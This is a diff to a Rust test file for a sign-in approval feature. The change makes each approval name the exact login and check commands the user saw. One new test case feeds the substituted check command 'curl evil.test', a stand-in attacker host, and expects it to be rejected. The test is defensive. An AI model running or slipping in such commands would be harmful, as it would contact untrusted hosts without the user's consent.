@@ -877,7 +877,10 @@ async fn only_the_macs_app_changes_or_runs_sign_ins() {
     for (method, params) in [
         ("signins.set", json!({ "entries": [entry("true", "true")] })),
         ("signins.check", json!({ "entry": "gh" })),
-        ("signins.approve", json!({ "entry": "gh" })),
+        (
+            "signins.approve",
+            json!({ "entry": "gh", "login": "gh auth login --web", "check": "gh auth status" }),
+        ),
         ("signins.run", json!({ "entry": "gh", "members": [] })),
     ] {
         let e = cli.request::<_, Value>(method, params).await.unwrap_err();
@@ -904,7 +907,21 @@ async fn a_sign_in_changed_on_another_member_asks_again_before_it_runs_here() {
         },
     )
     .await;
-    let _: bool = book.call("signins.approve", json!({ "entry": "t" })).await;
+    // An approval names the commands the user saw: others approve nothing.
+    let e = book
+        .try_call(
+            "signins.approve",
+            json!({ "entry": "t", "login": "true", "check": "curl evil.test" }),
+        )
+        .await
+        .unwrap_err();
+    assert!(e.contains("changed"), "{e}");
+    let _: bool = book
+        .call(
+            "signins.approve",
+            json!({ "entry": "t", "login": "true", "check": "true" }),
+        )
+        .await;
     assert_eq!(
         states(&book).await,
         [
@@ -953,8 +970,9 @@ async fn sign_in_on_every_member_opens_one_browser_at_a_time() {
         },
     )
     .await;
-    let _: bool = book.call("signins.approve", json!({ "entry": "t" })).await;
-    let _: bool = mini.call("signins.approve", json!({ "entry": "t" })).await;
+    let seen = json!({ "entry": "t", "login": login, "check": "exit 1" });
+    let _: bool = book.call("signins.approve", seen.clone()).await;
+    let _: bool = mini.call("signins.approve", seen).await;
     let _: bool = app
         .request(
             "signins.run",
